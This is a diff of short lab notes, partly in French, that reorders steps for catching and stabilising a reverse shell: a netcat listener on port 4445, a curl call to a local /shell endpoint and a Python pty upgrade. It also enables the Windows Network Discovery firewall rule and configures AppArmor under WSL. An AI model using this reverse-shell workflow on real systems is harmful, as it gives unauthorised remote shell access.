@@ -14,10 +14,14 @@ server {
         }
     }
 }   
-# terminal 1: 
-nc -lvnp 4445
+
 # terminal 2: 
 curl localhost:8080/shell
+
+# Si travaille en groupe : Activer la découverte réseau sur cmd windows
+netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes 
+# terminal 1: 
+nc -lvnp 4445
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 # Passer en background: ctrl+z
@@ -37,9 +41,7 @@ kernelCommandLine = lsm=apparmor,landlock,lockdown,yama,loadpin,safesetid,integr
 echo "none     /sys/kernel/security securityfs defaults            0      0" >> /etc/fstab
 
 # Restart WSL
-wsl --shutdown
-# Activer la découverte réseau sur cmd
-netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes   
+wsl --shutdown  
 
 sudo aa-status >> affiche les profiles
 
